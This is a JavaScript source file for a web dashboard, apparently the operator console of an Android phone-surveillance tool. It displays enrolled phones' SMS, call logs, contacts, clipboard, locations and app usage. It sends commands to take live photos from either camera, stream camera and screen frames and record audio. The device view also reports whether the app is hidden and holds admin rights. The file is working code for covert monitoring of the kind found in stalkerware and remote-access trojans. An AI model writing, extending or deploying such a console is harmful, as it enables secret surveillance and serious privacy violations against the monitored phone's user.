
const KINDS = ["SMS","Calls","Contacts","Apps","Locations","Clipboard","Usage","Media","Camera","Commands","Permissions","Screen"];

// Tabs that hold phone data: each one gets a "Fetch latest" button that asks
// the device to re-read its own source, plus a reload of the tab afterwards.
const DATA_KINDS = ["SMS","Calls","Contacts","Clipboard","Locations","Apps","Usage","Media"];

// Newest-first data stays newest-first on screen: these tabs reload themselves
// while they are open, so a fresh SMS or photo shows up without a click. The
// toggle in the tab bar turns that off per tab and is remembered.
const AUTO_DEFAULT = ["SMS","Calls","Contacts","Media"];
const AUTO_MS = 5000;

let state = { deviceId: null, kind: "SMS", catalog: {}, devices: [], timer: null,
              pollTimer: null, scopes: [], signedIn: false, refreshActions: {},
              autoTimer: null, auto: {}, rows: {}, shownPhotoId: null, cameraFacing: "back" };

const sleep = (ms) => new Promise(r => setTimeout(r, ms));

const SCOPE_LABELS = {
  commands: "Command log", sms: "SMS", calls: "Call log", contacts: "Contacts",
  clipboard: "Clipboard", apps: "Installed apps", locations: "Locations",
  usage: "App usage", media: "Photos / audio", permissions: "Permission report",
};

const $ = (id) => document.getElementById(id);
const esc = (v) => String(v === null || v === undefined ? "" : v)
  .replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;").replace(/"/g,"&quot;");

function toast(msg, bad) {
  const t = $("toast");
  t.textContent = msg;
  t.style.borderColor = bad ? "var(--bad)" : "var(--accent)";
  t.classList.add("show");
  clearTimeout(t._h);
  t._h = setTimeout(() => t.classList.remove("show"), 4000);
}

async function api(path, opts) {
  const r = await fetch(path, Object.assign({cache: "no-store"}, opts || {}));
  const ct = r.headers.get("content-type") || "";
  const body = ct.includes("json") ? await r.json() : await r.text();
  // 401 means the session expired or was never there; 503 with setup_required
  // means the operator never set a password. Both lock the console, differently.
  if (r.status === 401) {
    showLogin("Please sign in to see this data.");
    throw new Error("login required");
  }
  if (r.status === 503 && body && typeof body === "object" && body.setup_required) {
    showLogin(body.error || "No operator password is set yet.", true);
    throw new Error("login not configured");
  }
  if (!r.ok) throw new Error((body && body.error) || (r.status + " " + r.statusText));
  return body;
}

function ago(ts) {
  if (!ts) return "-";
  const then = new Date(ts.replace(" ", "T"));
  const s = Math.max(0, Math.round((Date.now() - then.getTime()) / 1000));
  if (s < 90) return s + "s ago";
  if (s < 5400) return Math.round(s / 60) + "m ago";
  if (s < 172800) return Math.round(s / 3600) + "h ago";
  return ts;
}

function renderDevices() {
  const box = $("devices");
  if (!state.devices.length) {
    box.innerHTML = '<div class="empty">No device enrolled yet.<br><br>Open the app on the phone and enroll it with this server address.</div>';
    return;
  }
  const onlineCount = state.devices.filter(d => d.online).length;
  $("online").textContent = onlineCount + " online / " + state.devices.length + " total";
  $("online").className = "pill " + (onlineCount ? "ok" : "bad");
  box.innerHTML = state.devices.map(d => {
    const sel = d.id === state.deviceId ? " sel" : "";
    const c = d.counts || {};
    return `<div class="dev${sel}" data-id="${d.id}">
      <div class="top"><span class="dot ${d.online ? "on" : ""}"></span>
        <span class="name">#${d.id} ${esc(d.label || d.device_uid)}</span></div>
      <div class="meta">${esc(d.model || "")} · app ${esc(d.app_version || "?")} · ${esc(d.ip_address || "-")}</div>
      <div class="meta">seen ${esc(ago(d.last_seen))}${d.battery !== null && d.battery !== undefined ? " · battery " + esc(d.battery) + "%" : ""}</div>
      <div class="badges">
        ${["sms","contacts","calls","apps","media"].map(k => `<span class="b">${k} ${c[k] || 0}</span>`).join("")}
      </div>
    </div>`;
  }).join("");
  box.querySelectorAll(".dev").forEach(el => el.onclick = () => selectDevice(Number(el.dataset.id)));
}

function selectDevice(id) {
  if (state.deviceId === id) return;
  state.deviceId = id;
  state.rows = {};            // "+N new" starts from scratch for the new device
  state.shownPhotoId = null;
  renderDevices();
  loadSummary();
  loadKind();
}

async function loadSummary() {
  if (!state.deviceId) return;
  try {
    const s = await api("/api/v1/web/device/" + state.deviceId);
    if (s.id !== state.deviceId) return;
    $("summary").innerHTML =
      `<b>#${s.id} ${esc(s.label || "")}</b>  uid ${esc(s.device_uid)}   ` +
      `${esc(s.model || "")} / ${esc(s.manufacturer || "")} (Android ${esc(s.android_release || "?")}, SDK ${esc(s.sdk_int || "?")})\n` +
      `ip ${esc(s.ip_address || "-")}   last seen ${esc(s.last_seen || "-")}   ` +
      `hidden=${esc(s.hidden)} admin=${esc(s.admin_active)}   ` +
      Object.entries(s.counts || {}).map(([k, v]) => `${k}=${v}`).join("  ");
  } catch (e) { /* transient */ }
}

function renderTabs() {
  $("tabs").innerHTML = KINDS.map(k =>
    `<button data-kind="${k}" class="${k === state.kind ? "on" : ""}">${k}</button>`).join("");
  $("tabs").querySelectorAll("button").forEach(b => b.onclick = () => {
    state.kind = b.dataset.kind;
    renderTabs();
    loadKind();
  }); 
}

async function loadKind() {
  const body = $("body");
  clearAuto();
  if (!state.deviceId) { body.innerHTML = '<div class="empty">Select a device to load its data.</div>'; return; }
  const id = state.deviceId;
  const kind = state.kind;
  try {
    if (kind === "Commands") return renderCommands(id);
    if (kind === "Permissions") return renderPermissions(id);
    if (kind === "Screen") return renderScreen(id);
    if (kind === "Camera") return renderCamera(id);
    body.innerHTML = tabToolbar(kind) + '<div id="tabBody"><div class="empty">loading…</div></div>';
    wireToolbar(id, kind);
    await refreshData();
    applyAuto(id, kind);
  } catch (e) {
    body.innerHTML = `<div class="empty">Could not load ${esc(kind)}: ${esc(e.message)}</div>`;
  }
}

// Every data tab opens with the same two controls: ask the phone for latest,
// and keep the tab reloading on its own while it is on screen.
function tabToolbar(kind) {
  const action = state.refreshActions[kind] || "sync_now";
  return `<div class="tabbar">
      <button id="fetchBtn" class="primary">Fetch latest</button>
      <span class="state" id="fetchState">asks the phone: <code>${esc(action)}</code></span>
      <label class="chk" title="Reload this tab every ${AUTO_MS / 1000} s while it is open">
        <input type="checkbox" id="autoChk" ${autoOn(kind) ? "checked" : ""}> auto ${AUTO_MS / 1000}s</label>
      <span class="state" id="tabMeta" style="margin-left:auto"></span>
    </div>`;
}

function wireToolbar(id, kind) {
  const btn = $("fetchBtn");
  if (btn) btn.onclick = () => fetchLatest(id, kind);
  const chk = $("autoChk");
  if (chk) chk.onchange = () => { setAuto(kind, chk.checked); applyAuto(id, kind); };
}

function autoOn(kind) {
  return state.auto[kind] !== undefined ? !!state.auto[kind] : AUTO_DEFAULT.includes(kind);
}

function setAuto(kind, on) {
  state.auto[kind] = !!on;
  try { localStorage.setItem("pc69.auto", JSON.stringify(state.auto)); }
  catch (e) { /* storage blocked; the toggle still works for this page */ }
}

function clearAuto() {
  if (state.autoTimer) { clearInterval(state.autoTimer); state.autoTimer = null; }
}

function applyAuto(id, kind) {
  clearAuto();
  if (!autoOn(kind)) return;
  state.autoTimer = setInterval(async () => {
    if (state.deviceId !== id || state.kind !== kind) return;
    try { await refreshData(); } catch (e) { /* transient; the next tick retries */ }
  }, AUTO_MS);
}

// Rows for the selected device and kind, drawn into the current tab body. This
// is the single place that learns the stored row count, so a fetch can report
// "+N new" and the auto-reload can run without duplicating the rendering.
async function refreshData() {
  const id = state.deviceId, kind = state.kind;
  const res = await api(`/api/v1/web/data/${id}/${encodeURIComponent(kind)}?limit=2000`);
  if (id !== state.deviceId || kind !== state.kind) return null;
  const before = state.rows[kind];
  state.rows[kind] = res.total;
  const box = $("tabBody");
  if (box) {
    if (kind === "Media") {
      box.innerHTML = res.rows.length ? mediaGrid(res.rows)
        : '<div class="empty">No files yet. Use “Live photo” or “Mic record” above.</div>';
    } else if (!res.rows.length) {
      box.innerHTML = `<div class="empty">No ${esc(kind.toLowerCase())} stored for this device yet.</div>`;
    } else {
      box.innerHTML = dataTable(res.columns, res.rows)
        + `<div class="empty" style="padding:8px 4px">showing ${res.rows.length} of ${res.total} rows</div>`;
    }
  }
  const meta = $("tabMeta");
  if (meta) {
    const fresh = (before !== undefined && res.total > before) ? ` · +${res.total - before} new` : "";
    meta.textContent = `updated ${new Date().toLocaleTimeString()} · ${res.total} row(s)${fresh}`;
  }
  return res;
}

function dataTable(columns, rows) {
  const head = columns.map(c => `<th>${esc(String(c).replace(/_/g, " "))}</th>`).join("");
  const body = rows.map(r => "<tr>" + columns.map(c =>
    `<td title="${esc(r[c])}">${esc(r[c])}</td>`).join("") + "</tr>").join("");
  return `<table><thead><tr>${head}</tr></thead><tbody>${body}</tbody></table>`;
}

function mediaGrid(rows) {
  return '<div class="media">' + rows.map(f => {
    const src = "/api/v1/web/media/" + f.id;
    const cap = `<div class="cap"><span class="tag">${esc(f.kind)}</span> ${esc(f.file || "")}<br>
      ${esc(f.bytes)} bytes · ${esc(f.time || "")} ·
      <a href="${src}" download style="color:var(--accent)">download</a></div>`;
    let inner;
    if ((f.kind === "photo" || f.kind === "screen") || /\.(jpg|jpeg|png)$/i.test(f.file || "")) {
      inner = `<img src="${src}" loading="lazy" alt="">`;
    } else if (/\.(wav|m4a|aac|mp3)$/i.test(f.file || "")) {
      inner = `<audio controls preload="none" src="${src}"></audio>`;
    } else {
      inner = `<div class="cap">preview unavailable</div>`;
    }
    return `<div class="card">${inner}${cap}</div>`;
  }).join("") + "</div>";
}

function setFetchState(text, cls) {
  const el = $("fetchState");
  if (el) { el.textContent = text; el.className = "state" + (cls ? " " + cls : ""); }
}

async function commandState(deviceId, commandId) {
  try {
    const res = await api("/api/v1/web/commands/" + deviceId);
    return (res.commands || []).find(c => Number(c.id) === Number(commandId)) || null;
  } catch (e) { return null; }
}

// Ask the phone to re-read its own source for this tab, then reload the tab.
// The queued command is followed until it answers, so a refused permission or
// an offline device is reported instead of leaving the operator guessing.
async function fetchLatest(deviceId, kind) {
  const action = state.refreshActions[kind] || "sync_now";
  const before = state.rows[kind];
  const btn = $("fetchBtn");
  if (btn) btn.disabled = true;
  setFetchState(`asking the phone: ${action} …`);
  let cmd;
  try {
    cmd = await api("/api/v1/web/command/" + deviceId, {
      method: "POST",
      headers: {"Content-Type": "application/json"},
      body: JSON.stringify({action, params: {}}),
    });
  } catch (e) {
    setFetchState("command rejected: " + e.message, "bad");
    if (btn) btn.disabled = false;
    return null;
  }
  try {
    const deadline = Date.now() + 25000;
    while (Date.now() < deadline) {
      await sleep(1500);
      if (state.deviceId !== deviceId) return cmd;
      if (state.kind === kind) { try { await refreshData(); } catch (e) { /* keep watching */ } }
      const now = state.rows[kind];
      const grown = before !== undefined && now !== undefined && now > before;
      const info = await commandState(deviceId, cmd.id);
      if (info && info.completed_at) {
        const bad = info.status !== "ok";
        setFetchState(`#${cmd.id} ${action} → ${info.status}`
          + (info.result_message ? `: ${info.result_message}` : "")
          + (grown ? ` (+${now - before} stored)` : ""), bad ? "warn" : "ok");
        if (state.kind === "Commands") renderCommands(deviceId);
        return info;
      }
      if (grown) {
        setFetchState(`#${cmd.id} ${action}: +${now - before} new row(s) stored`, "ok");
        return cmd;
      }
    }
    setFetchState(`#${cmd.id} ${action}: no answer yet (device offline or still syncing)`, "warn");
    return null;
  } finally {
    if (btn) btn.disabled = false;
  }
}

async function renderCommands(id) {
  const res = await api("/api/v1/web/commands/" + id);
  const body = $("body");
  if (!res.commands.length) { body.innerHTML = '<div class="empty">No commands queued yet.</div>'; return; }
  body.innerHTML = `<table><thead><tr><th>#</th><th>Action</th><th>Params</th><th>Status</th>
    <th>Result</th><th>Queued</th><th>Delivered</th><th>Done</th></tr></thead><tbody>` +
    res.commands.map(c => `<tr>
      <td>${c.id}</td><td>${esc(c.action)}</td>
      <td title="${esc(c.params)}">${esc(c.params)}</td>
      <td class="st-${esc(c.status)}">${esc(c.status)}</td>
      <td title="${esc(c.result_message)}">${esc(c.result_message || "")}</td>
      <td>${esc(c.created_at || "")}</td><td>${esc(c.delivered_at || "-")}</td>
      <td>${esc(c.completed_at || "-")}</td></tr>`).join("") + "</tbody></table>";
}

async function renderPermissions(id) {
  const res = await api("/api/v1/web/permissions/" + id);
  const body = $("body");
  if (!res.permissions.length) {
    body.innerHTML = '<div class="empty">The device has not reported permissions yet.</div>';
    return;
  }
  body.innerHTML = `<table><thead><tr><th>Permission</th><th>Granted</th><th>Updated</th></tr></thead><tbody>` +
    res.permissions.map(p => `<tr><td>${esc(p.permission)}</td>
      <td class="${p.granted ? "st-ok" : "st-error"}">${p.granted ? "yes" : "no"}</td>
      <td>${esc(p.updated_at || "")}</td></tr>`).join("") + "</tbody></table>";
}

function renderScreen(id) {
  const body = $("body");
  body.innerHTML = `<div class="empty" style="padding-bottom:8px">
      Live screen comes from the phone after “Live screen” is started. Frames refresh every 2 s.</div>
    <img id="frame" style="max-width:100%;border:1px solid var(--line);border-radius:8px"
         src="/api/v1/web/frame/${id}?t=${Date.now()}">`;
  if (state.timer) clearInterval(state.timer);
  state.timer = setInterval(() => {
    if (state.kind !== "Screen" || state.deviceId !== id) return;
    const img = document.getElementById("frame");
    if (img) img.src = "/api/v1/web/frame/" + id + "?t=" + Date.now();
  }, 2000);
}

// ---------------------------------------------------------------- camera tab

function setCamNote(text, cls) {
  const el = $("camNote");
  if (el) { el.textContent = text; el.className = "state" + (cls ? " " + cls : ""); }
}

// The newest camera frame the phone has uploaded, plus the recent ones beside
// it. Only a change of frame re-points the <img>: refreshing the same src every
// 2 s would blink the picture to black for every poll.
async function loadCamera(id) {
  let res;
  try { res = await api(`/api/v1/web/data/${id}/Media?limit=200`); }
  catch (e) { return null; }
  if (state.deviceId !== id || state.kind !== "Camera") return null;
  const photos = (res.rows || []).filter(f => f.kind === "photo" || /\.(jpg|jpeg|png)$/i.test(f.file || ""));
  const newest = photos[0] || null;
  const frame = $("camFrame");
  if (frame) {
    if (!newest) {
      frame.innerHTML = '<div class="empty">No camera frame stored yet. Press “Live photo”.</div>';
    } else if (state.shownPhotoId !== newest.id) {
      state.shownPhotoId = newest.id;
      frame.innerHTML = `<img id="camShotImg"
          style="max-width:100%;display:block;border:1px solid var(--line);border-radius:8px"
          src="/api/v1/web/media/${newest.id}?t=${Date.now()}">
        <div class="cap" style="padding:6px 2px">newest frame · ${esc(newest.time || "")} ·
        ${esc(newest.bytes)} bytes ·
        <a href="/api/v1/web/media/${newest.id}" download style="color:var(--accent)">download</a></div>`;
    }
  }
  const strip = $("camStrip");
  if (strip) strip.innerHTML = photos.slice(0, 8).map(f =>
    `<div class="card"><img src="/api/v1/web/media/${f.id}" loading="lazy" alt=""
       style="max-height:130px;object-fit:cover"><div class="cap">${esc(f.file || "")}</div></div>`
  ).join("") || '<div class="empty">No frames yet.</div>';
  return newest;
}

function renderCamera(id) {
  const body = $("body");
  body.innerHTML = `<div class="tabbar">
      <button id="camShot" class="primary">Live photo</button>
      <select id="camFacing">
        <option value="back">Back camera</option>
        <option value="front">Front camera</option>
      </select>
      <button id="camStart" class="ghost">Start live frames</button>
      <button id="camStop" class="ghost">Stop live frames</button>
      <span class="state" id="camNote">“Live photo” takes a still on the phone now; the newest frame
        stays on screen and is re-read every 2 s.</span>
    </div>
    <div style="display:flex;gap:14px;flex-wrap:wrap;align-items:flex-start">
      <div id="camFrame" style="flex:1 1 420px;min-width:260px"></div>
      <div style="flex:1 1 300px;min-width:220px">
        <div class="muted" style="margin:0 0 8px">Recent frames</div>
        <div id="camStrip" class="media"></div>
      </div>
    </div>`;
  $("camFacing").value = state.cameraFacing || "back";
  $("camFacing").onchange = () => { state.cameraFacing = $("camFacing").value; };
  $("camShot").onclick = () => livePhoto(id);
  $("camStart").onclick = () => {
    const facing = $("camFacing").value;
    sendCommand("camera_stream_start", {camera: facing, interval_ms: 5000});
    setCamNote(`live frames requested from the ${facing} camera every 5 s`);
  };
  $("camStop").onclick = () => {
    sendCommand("camera_stream_stop", {});
    setCamNote("live frames stopped");
  };
  state.shownPhotoId = null;
  loadCamera(id);
  if (state.timer) clearInterval(state.timer);
  state.timer = setInterval(() => {
    if (state.kind !== "Camera" || state.deviceId !== id) return;
    loadCamera(id);
  }, 2000);
}

// Live photo: queue camera_photo, then wait for the frame the phone uploads and
// show it immediately, instead of leaving the operator to reload the tab.
async function livePhoto(id) {
  const facing = ($("camFacing") && $("camFacing").value) || state.cameraFacing || "back";
  const before = state.shownPhotoId ? Number(state.shownPhotoId) : 0;
  setCamNote(`asking the phone for a ${facing}-camera still …`);
  const cmd = await sendCommand("camera_photo", {camera: facing}, true);
  if (!cmd) { setCamNote("the camera command was rejected", "bad"); return; }
  const deadline = Date.now() + 25000;
  while (Date.now() < deadline) {
    await sleep(1500);
    if (state.deviceId !== id || state.kind !== "Camera") return;
    const shot = await loadCamera(id);
    if (shot && Number(shot.id) > before) {
      const img = $("camShotImg");
      if (img) { img.classList.add("pulse"); setTimeout(() => img.classList.remove("pulse"), 2100); }
      setCamNote(`live photo stored · ${shot.bytes} bytes · ${shot.time || ""}`, "ok");
      toast("Live photo stored: " + (shot.file || shot.id));
      return;
    }
    const info = await commandState(id, cmd.id);
    if (info && info.completed_at) {
      const bad = info.status !== "ok";
      setCamNote(`#${cmd.id} camera_photo → ${info.status}`
        + (info.result_message ? `: ${info.result_message}` : ""), bad ? "warn" : "ok");
      return;
    }
  }
  setCamNote("no frame arrived yet (device offline, or CAMERA is still pending on the phone)", "warn");
}

// `quiet` skips the toast: callers that show their own progress (the live photo
// button) report the result themselves once the phone answers.
async function sendCommand(action, params, quiet) {
  if (!state.deviceId) { toast("Select a device first.", true); return null; }
  try {
    const res = await api("/api/v1/web/command/" + state.deviceId, {
      method: "POST",
      headers: {"Content-Type": "application/json"},
      body: JSON.stringify({action, params: params || {}}),
    });
    if (!quiet) {
      toast(`#${res.id} ${action} queued (${res.device_online ? "device online" : "device may be offline"})`);
    }
    if (state.kind === "Commands") renderCommands(state.deviceId);
    return res;
  } catch (e) { toast("Command failed: " + e.message, true); return null; }
}

function wireControls() {
  const sel = $("action");
  sel.onchange = () => {
    const spec = state.catalog[sel.value];
    $("params").value = JSON.stringify(spec ? spec[1] : {});
    $("hint").textContent = spec ? spec[0] : "";
  };
  $("send").onclick = () => {
    let params;
    try { params = JSON.parse($("params").value || "{}"); }
    catch (e) { toast("Params must be JSON: " + e.message, true); return; }
    sendCommand(sel.value, params);
  };
  document.querySelectorAll("[data-quick]").forEach(b => {
    b.onclick = () => {
      const q = JSON.parse(b.dataset.quick);
      sendCommand(q.action, q.params);
    };
  });
  // Header shortcuts for the three tabs that carry "latest" data: they open the
  // tab and run exactly the same fetch as the tab's own button.
  document.querySelectorAll("[data-fetch]").forEach(b => {
    b.onclick = () => {
      const kind = b.dataset.fetch;
      if (!state.deviceId) { toast("Select a device first.", true); return; }
      state.kind = kind;
      renderTabs();
      loadKind().then(() => fetchLatest(state.deviceId, kind));
    };
  });
  document.querySelectorAll("[data-live]").forEach(b => {
    b.onclick = () => {
      if (!state.deviceId) { toast("Select a device first.", true); return; }
      state.kind = "Camera";
      renderTabs();
      renderCamera(state.deviceId);
      if (b.dataset.live === "photo") {
        livePhoto(state.deviceId);
      } else {
        const facing = state.cameraFacing || "back";
        sendCommand("camera_stream_start", {camera: facing, interval_ms: 5000});
        setCamNote(`live frames requested from the ${facing} camera every 5 s`);
      }
    };
  });
  $("refresh").onclick = () => { poll(); loadKind(); loadSummary(); };
  $("delhist").onclick = deleteHistory;
}

async function poll() {
  try {
    const res = await api("/api/v1/web/devices");
    state.devices = res.devices;
    if (!state.deviceId && state.devices.length) state.deviceId = state.devices[0].id;
    renderDevices();
    $("tick").textContent = "live · " + new Date().toLocaleTimeString();
    $("tick").className = "pill ok";
    $("srv").textContent = res.server_url || "";
    if (state.deviceId) loadSummary();
  } catch (e) {
    $("tick").textContent = "offline: " + e.message;
    $("tick").className = "pill bad";
  }
}

function showLogin(message, setupRequired) {
  state.signedIn = false;
  if (state.timer) { clearInterval(state.timer); state.timer = null; }
  if (state.pollTimer) { clearInterval(state.pollTimer); state.pollTimer = null; }
  clearAuto();
  $("login").classList.add("show");
  $("loginMsg").textContent = message || "";
  $("loginUser").disabled = false;
  $("loginPass").disabled = !!setupRequired;
  $("loginGo").disabled = !!setupRequired;
  $("who").textContent = "";
  if (!setupRequired) setTimeout(() => $("loginUser").focus(), 60);
}

async function doLogin(ev) {
  ev.preventDefault();
  const username = $("loginUser").value.trim();
  const password = $("loginPass").value;
  if (!username || !password) { $("loginMsg").textContent = "Enter both fields."; return; }
  $("loginMsg").textContent = "checking…";
  $("loginGo").disabled = true;
  try {
    const r = await fetch("/auth/login", {
      method: "POST", cache: "no-store",
      headers: {"Content-Type": "application/json"},
      body: JSON.stringify({username, password}),
    });
    const body = await r.json().catch(() => ({}));
    if (!r.ok) {
      $("loginMsg").textContent = body.error || ("login failed (" + r.status + ")");
      return;
    }
    $("loginPass").value = "";
    $("loginMsg").textContent = "";
    $("login").classList.remove("show");
    $("who").textContent = "signed in as " + ((body.user && body.user.username) || username);
    await startDashboard();
  } catch (e) {
    $("loginMsg").textContent = "network error: " + e.message;
  } finally {
    $("loginGo").disabled = false;
  }
}

async function doLogout() {
  try { await fetch("/auth/logout", {method: "POST", cache: "no-store"}); } catch (e) { /* ignore */ }
  location.reload();
}

async function deleteHistory() {
  if (!state.deviceId) { toast("Select a device first.", true); return; }
  let dev;
  try { dev = await api("/api/v1/web/device/" + state.deviceId); }
  catch (e) { toast("Could not load the device: " + e.message, true); return; }
  const counts = dev.counts || {};
  const label = dev.label || dev.device_uid;
  $("modalTitle").textContent = "Delete history for " + label;
  $("modalNote").textContent = "Rows are removed from this server only. Nothing is deleted on the "
    + "phone, and the device stays enrolled - it simply starts filling these tables again.";
  $("modalMsg").textContent = "";
  $("modalScopes").innerHTML = (state.scopes.length ? state.scopes : Object.keys(SCOPE_LABELS))
    .map(k => `<label class="chk"><input type="checkbox" data-scope="${esc(k)}"
      ${k === "permissions" ? "" : "checked"}><span>${esc(SCOPE_LABELS[k] || k)}</span>
      <b>${esc(counts[k] || 0)}</b></label>`).join("");
  $("modal").classList.add("show");

  $("modalAll").onclick = () =>
    document.querySelectorAll("#modalScopes input").forEach(c => c.checked = true);
  $("modalNone").onclick = () =>
    document.querySelectorAll("#modalScopes input").forEach(c => c.checked = false);
  $("modalCancel").onclick = () => $("modal").classList.remove("show");
  $("modalGo").onclick = async () => {
    const chosen = [...document.querySelectorAll("#modalScopes input:checked")]
      .map(c => c.dataset.scope);
    if (!chosen.length) { $("modalMsg").textContent = "Tick at least one kind of history."; return; }
    const total = chosen.reduce((n, k) => n + Number(counts[k] || 0), 0);
    const detail = chosen.map(k => `  - ${SCOPE_LABELS[k] || k}: ${counts[k] || 0}`).join("\n");
    if (!confirm(`Permanently delete ${total} record(s) for ${label}?\n\n${detail}\n\n`
      + "Capture files for the media rows are deleted from disk as well. This cannot be undone.")) return;
    $("modalGo").disabled = true;
    try {
      // The server wants the target echoed back exactly, so a stale dialog or a
      // stray request cannot wipe a different device's history.
      const res = await api("/api/v1/web/history/" + state.deviceId, {
        method: "DELETE",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify({scopes: chosen,
          confirm: dev.device_uid + ":" + chosen.slice().sort().join(",")}),
      });
      $("modal").classList.remove("show");
      toast(`Deleted ${res.total} record(s)`
        + (res.files_removed ? ` and ${res.files_removed} file(s)` : ""));
      await poll();
      loadKind();
      loadSummary();
    } catch (e) {
      $("modalMsg").textContent = "Delete failed: " + e.message;
    } finally {
      $("modalGo").disabled = false;
    }
  };
}

async function startDashboard() {
  state.signedIn = true;
  try {
    const cat = await api("/api/v1/web/catalog");
    state.catalog = cat.catalog;
    state.scopes = cat.history_scopes || [];
    // Tab -> device action, so "Fetch latest" never hard-codes command names.
    state.refreshActions = cat.refresh_actions || {};
    $("action").innerHTML = Object.keys(state.catalog).sort().map(k =>
      `<option value="${esc(k)}">${esc(k)}</option>`).join("");
    $("action").value = "ping";
    $("params").value = "{}";
    $("hint").textContent = (state.catalog.ping || [""])[0];
  } catch (e) {
    if (state.signedIn) toast("Could not load command catalog: " + e.message, true);
    return;
  }
  wireControls();
  renderTabs();
  await poll();
  if (state.deviceId) { loadKind(); loadSummary(); }
  if (!state.pollTimer) state.pollTimer = setInterval(poll, 3000);
}

async function boot() {
  $("loginForm").onsubmit = doLogin;
  $("logout").onclick = doLogout;
  try { state.auto = JSON.parse(localStorage.getItem("pc69.auto") || "{}") || {}; }
  catch (e) { state.auto = {}; }
  try {
    const me = await api("/auth/me");
    $("who").textContent = "signed in as " + (me.username || "operator");
    await startDashboard();
  } catch (e) { /* api() already raised the right screen */ }
}

boot();
